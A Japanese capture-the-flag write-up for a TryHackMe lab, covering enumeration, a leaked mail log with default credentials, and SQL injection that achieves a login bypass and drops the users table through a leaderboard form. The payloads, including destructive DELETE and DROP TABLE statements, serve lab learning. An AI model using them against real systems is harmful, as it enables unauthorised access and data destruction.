# Injectics CTF

https://tryhackme.com/r/room/injectics

## Enumeration

### ポートスキャン

```shell
root@ip-10-10-4-190:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-05 00:40 GMT
Nmap scan report for 10.10.140.0
Host is up (0.00018s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:3D:01:EE:66:C3 (Unknown)
```

### gobuster

```shell
root@ip-10-10-4-190:~# gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.140.0
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/flags                (Status: 301) [Size: 310] [--> http://10.10.140.0/flags/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.140.0/css/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.140.0/js/]
/javascript           (Status: 301) [Size: 315] [--> http://10.10.140.0/javascript/]
/vendor               (Status: 301) [Size: 311] [--> http://10.10.140.0/vendor/]
/phpmyadmin           (Status: 301) [Size: 315] [--> http://10.10.140.0/phpmyadmin/]
/server-status        (Status: 403) [Size: 276]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================

gobuster dir -x php,txt,html -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
```

ホームページコメント
```html
<!-- Website developed by John Tim - dev@injectics.thm-->
<!-- Mails are stored in mail.log file-->
```

mail.log
```text
From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays

Hey,

Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.

To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.

Here are the default credentials that will be added:

| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |

Please let me know if there are any further updates or changes needed.

Best regards,
Dev Team

dev@injectics.thm
```

usersテーブルが削除されたり破損したりすると、自動的にデフォルト認証情報で復活する。1分間隔。  
usersテーブルを削除するSQLを注入できれば、管理者ログインもできることになる。

デフォルト認証情報  
superadmin@injectics.thm | superSecurePasswd101  
dev@injectics.thm | devPasswd123

ちなみに初期状態ではデフォルト認証情報でログインできなかった。

## ログイン画面

普通のログイン画面と、管理者用のログイン画面が分かれている。

### ログインバイパス

ログインバイパスを注入できるか？

```text
username=dev@injectics.thm&password=' OR '1'='1&function=login

username=dev@injectics.thm&password='%0AoR%0A'1'='1&function=login

username=dev@injectics.thm&password='%09||%091=1--&function=login
```

うまくいかない。

### Usersテーブル削除
  
usersテーブルの削除を注入できるか？

```text
username=dev@injectics.thm&password='; delete from users; --&function=login

username=dev@injectics.thm&password='; DROP TABLE users; --&function=login

username=dev@injectics.thm&password=';%09dElEtE%09fRoM%09users;--&function=login

username=dev@injectics.thm&password=';%0AdE/**/lEtE%0AfRoM/**/users;--&function=login
```

うまくいかない。

全く分からなかったのでウォークスルーを見た。  
intruderを使って、usernameフィールドにSQLiリストを適用して弱点を探る。  

```shell
wget https://github.com/payloadbox/sql-injection-payload-list/raw/refs/heads/master/Intruder/exploit/Auth_Bypass.txt
```

```text
このインジェクション（' OR 'x'='x'#;）で、
username='%20OR%20'x'%3d'x'%23%3b&password=aaa&function=login

ログインバイパスに成功している。
{"status":"success","message":"Login successful","is_admin":"true","first_name":"dev","last_name":"dev","redirect_link":"dashboard.php?isadmin=false"}
```
198個中、成功したのはこの1個だけ。  
手作業で探すのは無謀だった。


## dashboard.php

メダル数を編集できる画面

```http
POST /edit_leaderboard.php HTTP/1.1
Host: 10.10.140.0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://10.10.140.0
Connection: keep-alive
Referer: http://10.10.140.0/edit_leaderboard.php?rank=1&country=USA
Cookie: PHPSESSID=kt6pe4ohp0fh53i4tor0tc29lr
Upgrade-Insecure-Requests: 1

rank=1&country=&gold=22&silver=21&bronze=1233
```

これで users テーブルを Drop。Delete では復元されなかった。

```text
rank=1&country=&gold=22;drop+table+users;&silver=21&bronze=12345
→
Seems like database or some important table is deleted. InjecticsService is running to restore it. Please wait for 1-2 minutes.
```

## 管理者ログイン

profile画面へのリンクがあり、リンク先にはプロフィール変更のフォームがある。

Last Name にペイロードを入れてもそのままの形で保存される。

```text
last';select * from users;--
```


## 振り返り
- SQLiの脆弱性を手作業で探るのは無理。認証バイパスはintruderを使いやすい。
